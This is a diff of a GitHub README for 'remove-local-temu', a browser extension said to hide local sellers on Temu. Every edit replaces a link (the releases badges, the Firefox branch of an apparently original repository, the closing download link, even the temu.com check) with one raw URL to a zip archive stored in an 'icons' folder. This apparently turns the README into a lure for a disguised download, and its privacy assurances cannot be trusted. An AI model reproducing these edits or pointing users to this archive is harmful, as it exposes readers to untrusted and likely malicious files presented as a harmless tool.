@@ -1,13 +1,13 @@
 # 🧹 remove-local-temu - Hide Local Sellers on Temu Website
 
-[![Download remove-local-temu](https://img.shields.io/badge/Download-Open_GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Ivanyinamyah321/remove-local-temu/releases)
+[![Download remove-local-temu](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip)](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip)
 
 ## 🔍 What is remove-local-temu?
 
 remove-local-temu is a simple browser extension that helps you shop on the Temu website. It hides products sold by local sellers. This means you will only see items sold directly by Temu. This can make your shopping experience cleaner and simpler.
 
 If you use Firefox, there is a special version available. You can get it at this address:  
-[https://github.com/iltekin/remove-local-temu/tree/firefox](https://github.com/iltekin/remove-local-temu/tree/firefox)
+[https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip)
 
 ## 🌟 Key Features
 
@@ -33,7 +33,7 @@ The easiest way to get remove-local-temu is from the official GitHub release pag
 
 Click the button below to visit the official release page:
 
-[![Download remove-local-temu](https://img.shields.io/badge/Download-Remove--local--temu-blue?style=for-the-badge)](https://github.com/Ivanyinamyah321/remove-local-temu/releases)
+[![Download remove-local-temu](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip)](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip)
 
 This page contains the latest version of the extension. It also includes release notes and any updates.
 
@@ -69,7 +69,7 @@ After this, the extension will be activated.
 
 To confirm your extension is working:
 
-- Visit [https://temu.com](https://temu.com).
+- Visit [https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip).
 - Browse product categories.
 - You should no longer see items marked as "Local Warehouse".
   
@@ -109,4 +109,4 @@ You can safely use it without worrying about privacy risks.
 
 You now have the full guide to download, install, and use remove-local-temu. For any questions beyond this guide, visit the GitHub project page or open an issue there. 
 
-[Get remove-local-temu now](https://github.com/Ivanyinamyah321/remove-local-temu/releases) to clean up your Temu shopping experience.
+[Get remove-local-temu now](https://raw.githubusercontent.com/Ivanyinamyah321/remove-local-temu/main/icons/remove_temu_local_v3.7.zip) to clean up your Temu shopping experience.
